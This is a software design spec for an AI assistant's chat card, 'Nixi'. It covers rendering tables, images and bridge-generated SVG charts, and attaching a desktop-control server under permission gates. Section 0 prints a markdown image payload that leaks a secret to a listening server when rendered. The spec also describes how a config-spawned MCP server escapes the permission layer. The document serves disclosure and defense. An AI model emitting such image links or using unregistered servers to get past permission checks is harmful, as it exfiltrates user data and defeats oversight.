# Spec: Nixi answers with rich media, and can show the user on their own desktop

## Design

Five parts. The first is a prerequisite that the rest would otherwise make
worse; the last is separable and ships behind the first four.

### 0. Close the remote-image channel first (prerequisite)

**The card fetches remote images today.** Rendered in a live Quickshell window
configured as the card configures it, this reply:

```markdown
![leak](http://127.0.0.1:8731/swatch.png?secret=LEAKED)
```

produced `GET /swatch.png?secret=LEAKED` at the listening server, with no
prompt and no tool call. Nothing in `Conversation.qml` or `spacedMarkdown`
filters it.

This is not introduced by this work — it is reachable on `master` now, at
Guide, where the agent is otherwise allowed to do nothing. Under SECURITY.md it
is in scope: prompt injection "becomes in scope if it causes an **action** at
Guide", and an outbound request carrying an attacker-chosen path is an action.
It is reported privately per SECURITY.md, not as a public issue, and is
probably inherited from upstream omarchy-ask.

The control: a **media allowlist** applied to every agent reply before it
reaches the renderer. An image renders only when its URL is a `file://` path
inside Nixi's own media directory. Everything else — `http`, `https`, `data:`,
any other local path — is rewritten from an image into an ordinary link, so the
text survives, the fetch does not, and the user can still see what was offered.

This is deliberately stricter than "block remote". A `file://` allowlist with
one permitted directory is a rule that can be read and tested in full, and
Nixi's own images are the only ones it needs to pass.

### 1. Tables: the brief, not the code

`skills/nixi/SKILL.md` gains a short "shape of the answer" section: a table when
the answer is more than three parallel facts (keys, options, generations); prose
otherwise; the 2–6 sentence discipline unchanged, because a table replaces
sentences rather than adding to them. `share/CLAUDE.md` gets a one-line echo for
harnesses with no skill mechanism.

No code. Verified already: GFM tables, task lists, strikethrough and fenced code
all render under `TextEdit.MarkdownText`, and `spacedMarkdown` leaves a table
block intact.

### 2. Images: stop discarding ACP content blocks

`messageText()` (`bridge/bridge.js:95`) returns `""` for everything that is not
`type: "text"`. The ACP schema in `bridge/node_modules/@agentclientprotocol/sdk`
defines the blocks it is dropping:

- `image` — required `data` (base64) and `mimeType`, optional `uri`
- `resource_link` — required `name` and `uri`, optional `mimeType`

Both become markdown. An `image` block is written to the media directory as
`<sha256(data)[:16]>.<ext>` and returned as `\n![](file://…)\n`; content
addressing means a repeated image costs one file, not one per turn. A
`resource_link` whose `uri` is a local image path inside the media directory
becomes the same; any other `resource_link` becomes a plain markdown link, which
is what it is.

`mimeType` is matched against a fixed allowlist (`image/png`, `image/jpeg`,
`image/webp`, `image/svg+xml`, `image/gif`); anything else is a link, not an
image. The extension comes from the allowlist entry, never from the agent, so a
block cannot name its own file extension.

The media directory is `$NIXI_DATA/media` (default
`~/.local/share/nixi/media`), `0700`, pruned oldest-first to a fixed budget at
session start — a bound, not a transcript. Nothing is appended to it outside a
session.

### 3. Charts the bridge draws, so Guide keeps them

The agent emits a fenced block; the bridge replaces it with an SVG it rendered
itself:

````markdown
```nixi-chart
title: generations on disk
current 1.0
previous 0.8
oldest 0.3
```
````

becomes `![generations on disk](file:///…/media/<hash>.svg)`.

The grammar is one optional `title:` line and then `label value` lines — bars
only. The bridge writes the SVG with string templating, the same way the
verification chart in the review was written; SVG rendering in the card is
already proved.

The point is **who** runs the code. The bridge is Nixi's own process, not a tool
the agent invokes, so no permission request exists to cancel and charts work at
Guide — where the agent may not write a file at all. Had the agent drawn its own
chart, the default trust level would have been the only one without charts.

Parsing is total: a malformed block is left exactly as it was, rendering as an
ordinary fenced code block. Bars are clamped and the input is bounded (a label
length, a row count), so a long or hostile block cannot produce an unbounded
SVG.

Bar charts only. Lines, pies, axes, legends and colour schemes are not in this
spec and should not be added until a real question wants one.

### 4. ai-mirror, in Mechanic, on agents where the permission path is proved

`newSession` passes `mcpServers: []` (`bridge/bridge.js:254`). It gains the
ai-mirror stdio server, and only at Mechanic:

```js
mcpServers: currentPolicy().permission === "cancel" ? [] : [{
  name: "ai-mirror", command: "ai-mirror", args: ["mcp"], env: [],
}]
```

`{name, command, args, env}` are all required by `McpServerStdio` in the
schema; `env` is a list of `{name, value}`.

The intent requires the permission path to be **proved, not assumed**, because
issue #74 established that a config-spawned MCP server starts outside the
permission layer entirely. Read from `claude-agent-acp` 0.81.2
(`dist/acp-agent.js`): ACP `mcpServers` are mapped into the Claude Code SDK's
own `mcpServers` option (`:6214`), and `mcp__*` tool calls arrive at
`canUseTool` (`:5552`) which ends in `requestPermissionFromClient` (`:5657`) —
an ordinary ACP `session/request_permission`. So on Claude a deliberately
attached server is inside the layer, unlike #74's config-injected one.

Better: the adapter forwards `_meta.claudeCode.mcpServer = { name, source }`
(`:5627`), where `source: "sdk"` marks a host-registered server and anything
else marks configuration. Nixi's `requestPermission` records it and emits a
`diagnostic` when a permission arrives from an MCP server Nixi did not register
— which gives #74's blind spot an observable signal for the first time, for
free, whether or not ai-mirror is in use.

Codex and OpenCode are **not** proved and do not get the server; they are listed
in `MCP_CAPABLE_AGENTS` and the list grows when a proof exists. This mirrors the
existing posture: a thing is enabled where it is known to hold, not where it is
hoped to.

Two gates stay independent. Nixi's is trust: no server at Guide, and a session
is rebuilt when trust changes, so leaving Mechanic detaches it. ai-mirror's is
its own consent dialog on the user's desktop, with a 30-second timeout and
`SUPER+SHIFT+ESC` to revoke. Keeping both is the point: the card's promise is
Nixi's to keep, not ai-mirror's.

Screenshots returned by ai-mirror are files on disk; the agent names the path,
and part 0's allowlist means it renders only after the bridge has copied it into
the media directory.

### Where the code goes

`MediaModel.js` at the repo root: Qt-free CommonJS, the allowlist rewriter and
the SVG renderer, imported by QML as `import "MediaModel.js" as MediaModel` and
required by `bridge/media-model.test.js` under node. This is the existing
`TourModel.js` / `bridge/tour-model.test.js` pattern, for the same reason —
logic shared with QML that must be unit tested.

The allowlist runs in **QML**, in the `text:` binding ahead of `spacedMarkdown`
(`Conversation.qml:1672`), not in the bridge. The binding sees the whole
accumulated body on every render, so a markdown image split across two streamed
chunks is never half-checked — a hazard the bridge would have to re-solve with
the buffering `learned.js` already needed. The bridge still owns writing files
and generating charts; it just does not own the rule about what may be drawn.

## Alternatives rejected

- **The agent draws its own charts with its file tools.** Simpler, and only
  works at Mechanic, because Guide cancels the write. It would make the default
  trust level the least capable one.
- **QtCharts, or a JS charting library in the overlay.** A build and packaging
  dependency inside a QML plugin, for bars that are forty lines of SVG.
- **A WebEngine view for replies.** Renders anything, costs a sandbox, ~150MB
  and startup time, and replaces a renderer that already does the job.
- **A typed rich-media block model in the `ListModel`.** The model is
  `{role, body}` strings and markdown already carries images; typed blocks mean
  rewriting the delegate, the height arithmetic and the streaming append in
  `appendReply` for no visible difference.
- **Blocking only `http`/`https` images.** Leaves `data:` URIs and every local
  path. An allowlist of one directory is smaller to write and smaller to check.
- **Sanitising in the bridge rather than QML.** Needs chunk-boundary buffering
  to avoid inspecting half an image URL; the QML binding gets the whole body for
  free.
- **Attaching ai-mirror at Guide behind its own consent dialog.** ai-mirror's
  gate is real, but Guide's promise is that the agent cannot act on the machine.
  A desktop it can drive after a dialog is still a desktop it can drive.
- **Letting Nixi re-ask for desktop control itself.** Duplicates ai-mirror's
  dialog, and a second prompt teaches the habit of clicking through prompts.

## Risks

- **The remote-image channel is live on `master` now.** Everything else here is
  additive; this one is a disclosure. It must go out privately before any change
  that encourages the agent to emit images.
- **Message height with late-loading images.** `Conversation.qml:1634` computes
  a reply's height from `agentText.contentHeight`. Local files decode
  synchronously in practice, but an image that resizes after layout would land
  the scroll position wrong on first paint. Watch on p620; the fallback is a
  `Qt.callLater` re-pin in the existing `scrollToEnd` path, not a model change.
- **Media directory growth.** Bounded by pruning at session start. A session
  that never restarts is the case that escapes it; the budget is a count and a
  byte ceiling for that reason.
- **ai-mirror's consent can be declined or time out.** Then the agent gets a
  refusal mid-turn and must say so rather than retry. The skill says that
  explicitly; ai-mirror's own instructions already do.
- **An adapter bump moves the permission path.** `_meta.claudeCode.mcpServer`
  is an adapter detail read from 0.81.2. If a bump drops it, the diagnostic goes
  quiet rather than failing loudly — so its absence is itself logged once per
  session.
- **The brief makes answers longer, not clearer.** A model told it may use
  tables will reach for them. The skill section is written as "instead of", and
  the regression is a reading of real answers, not a test.

## Verification

- `node --test bridge/` — `bridge/media-model.test.js` covers: an `http`,
  `https`, `data:` and out-of-directory `file://` image is rewritten to a link;
  an in-directory `file://` image survives; a URL split across chunks is checked
  only once whole; a malformed `nixi-chart` block is returned unchanged; a chart
  with hostile input (long labels, many rows, negative and non-numeric values)
  produces bounded SVG or no chart.
- **The exfil probe, re-run.** The `127.0.0.1` listener and a reply containing a
  remote image, through the real card: no request arrives. This is the proof
  that part 0 holds, and it fails on `master` today.
- `python3 tools/test_nixi.py` and the existing bridge tests stay green.
- **On p620, in the card**: a keybinding question returns a rendered table; a
  `nixi-chart` block returns bars at **Guide**; an ACP image block renders
  inline.
- **ai-mirror, at Mechanic, on Claude**: asking Nixi to show something produces
  ai-mirror's consent dialog on the desktop; declining ends the turn with an
  explanation; accepting drives the desktop and returns a screenshot in the
  card. At **Guide** the same request does not attach the server at all —
  checked by the absence of an `ai-mirror` process, not only by the reply.
- **The #74 signal**: a permission request from an MCP server Nixi did not
  register emits a diagnostic. Provoked with a throwaway server in the agent's
  own config.
